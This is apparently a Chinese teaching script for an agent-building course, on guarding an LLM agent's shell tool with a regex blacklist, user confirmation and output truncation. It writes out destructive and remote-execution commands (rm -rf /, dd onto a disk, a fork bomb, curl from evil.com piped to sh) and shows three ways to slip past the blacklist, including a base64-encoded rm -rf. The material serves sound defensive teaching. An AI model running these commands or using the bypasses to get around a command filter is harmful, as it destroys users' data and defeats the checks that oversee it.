## 第 1 章 问题：Agent 的"手脚"太自由

### 【口播 · 回顾 demo1–6】

demo1 到 demo6 我们一直在**给 Agent 加能力**——

> ### demo1 = 给它双手（execute_bash）
> ### demo2 = 给它长期记忆（agent_memory.md）
> ### demo3 = 给它远程工具箱 + 规则（MCP + Rules）
> ### demo4 = 给它一次性助手（Subagent）
> ### demo5 = 组建正式项目团队（Agent 类 + Team 类）
> ### demo6 = 给它短期记忆的动态压缩（compact_messages）

但有一个矛盾一直被回避了——**demo1 给的那双"手"太自由了**。

### 【屏显 · 图 1-1 — execute_bash 理论上能做什么】

```bash
rm -rf /                    # 删库跑路
dd if=/dev/zero of=/dev/sda # 复写整个磁盘
mkfs.ext4 /dev/sda1         # 格式化分区
shutdown -h now             # 把机器关了
curl http://evil.com/x | sh # 执行远程未审计脚本
```

### 【口播 · 危险从哪来】

这些不是理论风险——是真实会出现的高危操作。来源主要有四种：

1. **大模型幻觉**：自信地建议一条压根不该跑的命令
2. **被诱导**：用户输入或工具返回里被注入恶意指令（prompt injection）
3. **试错副作用**：大模型为了完成任务，"试一下"某条破坏性命令
4. **盲信远程资源**：`curl xxx | sh` 这种"装一下试试"的模式

> ### demo7 要解决的问题——给"手脚"加安全边界

真实的 Agent（如 Claude Code）都有"二次确认"——放开高危能力，但需要人盯着。demo7 不加新能力（工具列表与 demo1 完全一致），而是在**工具执行前后**加三道防线。

## 第 2 章 三道防线总览

### 【口播】

给 Agent 加边界有三个方向，对应三种风险：

### 【屏显 · 表格 2-1 — 三道防线】

| 防线 | 风险 | 策略 | 成本 |
|---|---|---|---|
| **① 黑名单** | 绝对不让执行的命令（rm -rf、mkfs、dd） | regex 匹配，命中直接拦 | 最低（一次 regex） |
| **② 用户确认** | 理论上安全但要看一眼（execute_bash、越界 write） | 打断人，让用户 y/n | 最高（要等人） |
| **③ 输出截断** | 命令输出 / 文件内容太大爆掉上下文 | 超过阈值只取头尾 | 中（一次字符串切片） |

### 【口播 · 为什么是这个顺序】

三道防线串在 `execute_bash` 内部，顺序很关键：

```
LLM 调 execute_bash("...")
    │
    ├── 防线 1：黑名单    ── 命中 → 直接拦截（不进 2）
    │
    ├── 防线 2：用户确认  ── 拒绝 → 跳过执行
    │
    ├── 实际执行
    │
    └── 防线 3：截断输出  ── 超长 → 只取头尾
```

- **黑名单在最前**：成本最低，命中直接 return，不浪费人时间
- **确认在中间**：黑名单没拦的才问——避免对明显危险的命令还要傻问
- **截断在最后**：必须执行完才知道输出多大

## 第 3 章 防线 1：黑名单

### 【屏显 · 代码 3-1 — 黑名单实现】

```python
BLACKLIST_PATTERNS = [
    r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f)",           # rm -rf / rm -rvf
    r"\brm\s+(-[a-zA-Z]*f[a-zA-Z]*r)",           # rm -fr
    r"\brm\s+-\S*\s+\*\s*$",                     # rm *  (通配删除)
    r"\bdd\b.*\bof\s*=\s*/dev/(sd|nvme|hd)",     # dd of=/dev/sda  复写磁盘
    r"\bmkfs\.",                                  # mkfs.ext4 / mkfs.xfs  格式化
    r"\bshutdown\b",
    r"\breboot\b",
    r"\bhalt\b",
    r"\bpoweroff\b",
    r":\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}",      # fork bomb  :(){:|:&};:
    r">\s*/dev/(sd|nvme|hd)",                    # cat x > /dev/sda
    r"\bformat\s+[A-Z]:",                         # Windows format C:
    r"\bcurl\b.*\|\s*(sh|bash|python)",          # curl xxx | sh
    r"\bwget\b.*\|\s*(sh|bash|python)",
]

_BLACKLIST_RE = [re.compile(p, re.IGNORECASE) for p in BLACKLIST_PATTERNS]


def is_blacklisted(command: str) -> bool:
    return any(rx.search(command) for rx in _BLACKLIST_RE)
```

### 【屏显 · 表格 3-1 — 实测拦截结果】

| 命令 | 是否拦截 |
|---|---|
| `rm -rf /` | ✅ |
| `rm -rf test_dir` | ✅（教学用：所有 `rm -rf` 都拦） |
| `rm -fr /tmp` | ✅ |
| `dd if=/dev/zero of=/dev/sda` | ✅ |
| `mkfs.ext4 /dev/sda1` | ✅ |
| `shutdown -h now` | ✅ |
| `reboot` | ✅ |
| `:(){ :|:& };:` (fork bomb) | ✅ |
| `curl http://x.com/install.sh \| sh` | ✅ |
| `ls -la` | ❌（放行） |
| `echo hello` | ❌（放行） |
| `python -c "print(1+2)"` | ❌（放行） |
| `rm test_dir/a.txt`（不带 `-rf`） | ❌（放行） |

### 【口播 · 黑名单的局限】

**黑名单靠正则，永远绕得过去**——

```bash
# 绕过方式 1：用 Python 删
python -c "import os, shutil; shutil.rmtree('test_dir')"

# 绕过方式 2：base64 编码
echo cm0gLXJmIC8= | base64 -d | sh

# 绕过方式 3：变量拼接
cmd="r""m -rf"; $cmd /
```

所以黑名单只能挡"明显的高危"——**真正兜底的是防线 2（用户确认）**。生产级做法是把"分级 + 沙箱 + 黑名单"组合用，单独任何一种都不够（第 8 章详述）。

## 第 4 章 防线 2：用户确认

### 【口播 · 策略表】

黑名单之外的命令/操作，靠人盯。每个工具的策略不同：

### 【屏显 · 表格 4-1 — 各工具的确认策略】

| 工具 | 策略 | 理由 |
|---|---|---|
| `read_file` | **直接放行** | 只读，无副作用 |
| `write_file` | **项目目录内放行；项目外确认** | 越界写有风险（覆盖配置、系统文件） |
| `execute_bash` | **每次都确认** | 不依赖大模型审核命令——它审不过来 |

### 【屏显 · 代码 4-1 — 确认函数（含三选项）】

```python
_auto_approve_bash = False   # 全局开关：本会话是否对所有 bash 免确认

def confirm_action(prompt: str, auto_approve_ok: bool = False) -> bool:
    global _auto_approve_bash
    if auto_approve_ok and _auto_approve_bash:
        return True

    print(f"[需要确认] {prompt}")
    while True:
        choice = input("  允许执行吗？[y/n/a] (y=本次允许, n=拒绝, a=本次会话全允许): ")
        if choice in {"y", "yes"}:  return True
        if choice in {"n", "no", ""}:  return False
        if choice == "a":
            _auto_approve_bash = True
            return True
```

### 【口播 · 三选项的设计】

用户可选 `[y/n/a]`：

- **y** = 本次同意（下次还要问）
- **n** = 本次拒绝（大模型会看到拒绝消息，自己换策略）
- **a** = 本次会话全部同意（避免后续繁琐）

> ⚠️ **越界 write_file 永远问**——不受 `a` 免确认开关影响。这是有意的：`execute_bash` 风险已知（都是 shell 命令），但"写到哪里"是路径决定的，不能一刀切放行。

### 【屏显 · 代码 4-2 — write_file 越界确认：auto_approve_ok=False】

```python
def write_file(path: str, content: str) -> str:
    if not is_in_project_dir(path):
        preview = content if len(content) <= 80 else content[:80] + "..."
        if not confirm_action(
            f"write_file 越界写入（项目外）：\n  路径: {path}\n  内容预览: {preview}",
            auto_approve_ok=False,   # 越界写永远问，不受免确认开关影响
        ):
            return f"[拒绝] 用户未允许越界写入：{path}"
    # ...实际写入...
```

注意 `auto_approve_ok=False`——即使全局开关 `_auto_approve_bash=True`（用户之前选了 `a`），越界写仍然每次都问。对比 `execute_bash` 传的是 `auto_approve_ok=True`，会检查全局开关是否已开启。

## 第 5 章 防线 3：输出截断

### 【口播 · 场景】

大模型可能这样调用：

```bash
cat /var/log/syslog        # 系统 log，可能几个 G
find / -name "*.py"        # 全盘扫，输出几万行
read agent.py              # 长 Python 文件
```

这些命令的输出会**原样塞进 messages**——一次就可能把上下文顶爆，连 demo6 的压缩都来不及（压缩是 step 级的，工具返回是即时的）。

### 【屏显 · 代码 5-1 — 截断函数】

```python
OUTPUT_TRUNCATE_THRESHOLD = 5000   # 超过此长度触发截断
OUTPUT_TRUNCATE_HEAD      = 2000   # 截断后保留前 N 字符
OUTPUT_TRUNCATE_TAIL      = 2000   # 截断后保留后 N 字符

def truncate_output(text, threshold=OUTPUT_TRUNCATE_THRESHOLD,
                    head=OUTPUT_TRUNCATE_HEAD, tail=OUTPUT_TRUNCATE_TAIL):
    if len(text) <= threshold:
        return text
    return (
        text[:head]
        + f"\n\n... [内容已截断：共 {len(text)} 字符，仅显示头 {head} + 尾 {tail}]\n\n"
        + text[-tail:]
    )
```

### 【屏显 · 图 5-1 — 截断前后对比】

```
原始（22951 字符的 agent.py）:
┌──────────────────────────────────────────────────┐
│ #!/usr/bin/env python                            │
│ # -*- coding: utf-8 -*-                          │
│ """                                              │
│ Demo7 - Agent 的安全边界...                      │
│                                                  │
│             ...... 中间 18000 字符 ......          │
│                                                  │
│ if __name__ == "__main__":                       │
│     main()                                       │
└──────────────────────────────────────────────────┘

截断后（4045 字符）:
┌──────────────────────────────────────────────────┐
│ #!/usr/bin/env python                            │
│ # -*- coding: utf-8 -*-                          │
│ """                                              │
│ Demo7 - Agent 的安全边界...                      │
│             ...... 前 2000 字符                   │
│                                                  │
│ ... [内容已截断：共 22951 字符，仅显示头 2000 + 尾 2000] ...
│                                                  │
│             ...... 后 2000 字符                   │
│ if __name__ == "__main__":                       │
│     main()                                       │
└──────────────────────────────────────────────────┘
```

### 【口播 · 取头尾而不是只取头】

为什么取头 + 尾？因为对大模型和展示来说：
- **头部**：通常有 shebang、imports、docstring——知道这是什么文件
- **尾部**：通常有 `if __name__ == "__main__"`、入口逻辑——知道它怎么启动
- 只取头会丢掉"最后做了什么"的关键信息

### 【口播 · 阈值故意做成模块常量】

```python
OUTPUT_TRUNCATE_THRESHOLD = 5000   # 改这一行就能调
```

演示时把它调小到 `1000`，跑一个"读 agent.py 并总结"的任务就能立即看到截断效果。生产实现应该**按 token 算**而不是字符数——一条 tool_result 里中英文混合时，字符数和 token 数差异很大。

## 第 6 章 三道防线在 execute_bash 内的串联

### 【口播】

三道防线不是孤立的，它们串在 `execute_bash` 函数里，顺序执行：

### 【屏显 · 代码 6-1 — 带三道防线的 execute_bash】

```python
def execute_bash(command: str) -> str:
    # ---- 防线 1：黑名单 ----
    if is_blacklisted(command):
        return (
            f"[拦截] 命令命中黑名单，已拒绝执行：\n"
            f"  {command}\n"
            f"如需删除文件，请用更具体的路径（不要用通配符 / 根目录），"
            f"或用 Python 等方式逐个删除。"
        )

    # ---- 防线 2：用户确认 ----
    preview = command if len(command) <= 100 else command[:100] + "..."
    if not confirm_action(f"execute_bash: {preview}", auto_approve_ok=True):
        return f"[拒绝] 用户未允许执行：{command}"

    # ---- 实际执行 ----
    result = subprocess.run(command, shell=True, capture_output=True, ...)
    raw = "\n".join([result.stdout, result.stderr, ...])

    # ---- 防线 3：截断 ----
    return truncate_output(raw)
```

### 【口播 · 拦截 vs 拒绝 vs 截断——返回给 LLM 的话不同】

- **拦截（防线 1）**：告诉 LLM "命中黑名单，请换方式" → LLM 会改用 Python 或更具体的路径
- **拒绝（防线 2）**：告诉 LLM "用户未允许" → LLM 也会换策略，或直接放弃
- **截断（防线 3）**：告诉 LLM "原始 X 字符，已截断为头尾各 2000" → LLM 知道这不是完整内容

这三种返回**都进 messages**，大模型据此调整后续决策——这是 Agent 的"感知"通道。

## 第 8 章 demo7 vs 生产级（Claude Code 等）

### 【口播】

demo7 是教学版，简化了很多。这一章对比生产级做法：

### 【屏显 · 表格 8-1 — demo7 vs 生产级对比】

| 维度 | demo7（教学版） | 生产级（Claude Code 等） |
|---|---|---|
| **命令分级** | 黑名单 + 每次确认（粗暴二分） | **精细分级**：safe（ls 直接过）/ caution（确认）/ blocked（拦） |
| **用户选项** | y / n / a（3 选 1） | **更多选项**：本次允许 / 此类命令永久允许 / 全局允许 / 拒绝 |
| **文件系统** | 路径检查（项目内 vs 外） | **沙箱**：Docker、chroot、只读挂载 |
| **网络** | 无管控 | **域名黑白名单**、禁止执行远程脚本 |
| **截断指标** | 字符数（5000） | **token 数**（精确，中英文差异大） |
| **超大输出** | 头尾各取 N | **让 LLM 先做摘要**再灌入 messages |
| **可扩展性** | 硬编码在 execute_bash 内 | **pre-check / post-check hook 架构**（第 9 章） |

### 【口播 · 逐项解读】

- **命令分级**：demo7 所有 `execute_bash` 都问，`ls` 也要确认——繁琐。生产会把 `ls/cat/echo/grep` 这种只读命令直接放行，把 `rm/mv/dd` 这种写入命令才确认，把 `rm -rf /` 这种直接拦
- **用户选项**：Claude Code 的"此类命令永久允许"很关键——让用户一次性放行 `git status` 这种安全命令，避免每次都问
- **沙箱**：生产 Agent 跑在 Docker 里，文件系统隔离——即便命令再危险，也只能搞坏容器，碰不到宿主机
- **token 计数**：demo7 按字符数截断，但中文一个字 ≈ 2-3 token，英文一个字符 ≈ 0.25 token——按字符截断误差很大
- **LLM 摘要**：超大输出 demo7 取头尾，生产会让另一个 LLM 实例先做摘要，摘要再灌入 messages——信息保留更好

> ### 核心原理不变：分层防护 + 用户兜底
> demo7 简化的是实现细节，核心思路（黑名单兜明显危险、用户兜模糊地带、截断防撑爆）和生产级一致。

## 第 9 章 改进方向：pre-check / post-check hook 架构

### 【口播 · 硬编码的问题】

demo7 的三道防线**全部硬编码在 `execute_bash` 内**——

```python
def execute_bash(command):
    if is_blacklisted(command): return ...   # ← 硬编码
    if not confirm_action(...): return ...   # ← 硬编码
    raw = subprocess.run(...)
    return truncate_output(raw)              # ← 硬编码
```

要加一个新检查（比如"命令包含密码就脱敏"）就得改 `execute_bash` 源码。生产级做法是 **hook 架构**：

### 【屏显 · 图 9-1 — pre-check / post-check hook 架构】

```
LLM 调工具
    │
    ├──→ [pre-check hooks]    ← 多个独立函数，每个检查一项
    │     · blacklist_hook     (黑名单)
    │     · confirm_hook       (用户确认)
    │     · network_policy_hook(网络黑白名单)
    │     · secret_scan_hook   (敏感信息扫描)
    │     · ...                ← 加新检查只加新 hook，不改主代码
    │
    ├──→ 实际执行
    │
    └──→ [post-check hooks]    ← 执行后处理
          · truncate_hook      (截断)
          · redact_hook        (脱敏：密码、内网信息)
          · log_hook           (审计日志)
```

### 【口播 · hook 架构的好处】

1. **加新检查不改主代码**——只写一个新 hook 函数，注册到列表里
2. **不适用就跳过**——hook 内部判断"这个工具要不要管"，不管就直接 return None
3. **可配置**——不同环境挂不同 hook 集合：
   - 可信内网：只挂截断 + 日志
   - 公网生产：黑名单 + 确认 + 网络 + 脱敏全挂
   - CTF 演练：什么都别挂（放飞）

### 【口播 · 一个真实的 post-check 场景：脱敏】

```python
def redact_hook(tool_name, args, result):
    """执行后扫一遍结果，把密码、token、内网 IP 替换掉"""
    if tool_name == "execute_bash":
        result = re.sub(r'password=\S+', 'password=***', result)
        result = re.sub(r'10\.\d+\.\d+\.\d+', '10.x.x.x', result)
    return result
```

内网环境下，命令输出经常带敏感信息（数据库密码、内网 IP）——post-check hook 在送入 messages 前脱敏，避免大模型把秘密写进日志或被注入攻击偷走。

## 第 10 章 demo1–7 系列回顾

### 【口播 · 整体脉络】

七个 demo 是一个**渐进扩展**的过程——我们一直在扩展 Agent 的能力边界，同时给它加上相应的约束：

### 【屏显 · 表格 10-1 — demo1–7 的能力扩展与约束】

| Demo | 比喻 | 加的能力 | 加的约束 |
|---|---|---|---|
| demo1 | 给它**双手** | LLM × 工具 × 循环 | MAX_ITERATIONS（防死循环） |
| demo2 | 给它**纸笔** | agent_memory.md + plan | 记忆窗口（防无限增长） |
| demo3 | 给它**远程工具箱 + 规则** | MCP + Rules | Rules 约束行为 |
| demo4 | 给它**一次性助手** | Subagent | 禁止递归（防无限派生） |
| demo5 | 组建**正式项目团队** | Agent 类 + Team 类 | 质检员状态机（最多 3 次重试） |
| demo6 | 给它**短期记忆的动态压缩** | compact_messages | 阈值触发（防上下文爆） |
| **demo7** | 给它**手脚的安全防护** | （无新能力） | **三道防线**（黑名单 / 确认 / 截断） |

### 【口播 · demo7 的定位】

demo1–6 让 Agent **能干更多事**——给它工具、记忆、团队、压缩。
demo7 不加能力，反而**给能力加约束**——让它干得多但不会"手抖"把系统搞坏。

> ### demo7 = 给"手脚"戴上护具——黑名单兜底，用户确认兜模糊，截断兜输出爆炸

### 【口播 · 整体收尾】

七个 demo 走完，我们实现了一个简单的 Agent 工程闭环：

- **能力侧**（demo1–6）：工具、记忆、外部协作、团队、上下文管理
- **约束侧**（demo7）：安全边界

两者缺一不可——只加能力不加约束，Agent 是个"闯祸精"；只加约束不加能力，Agent 是个"摆设"。真正的智能体，是**在能力与约束之间找到平衡**。
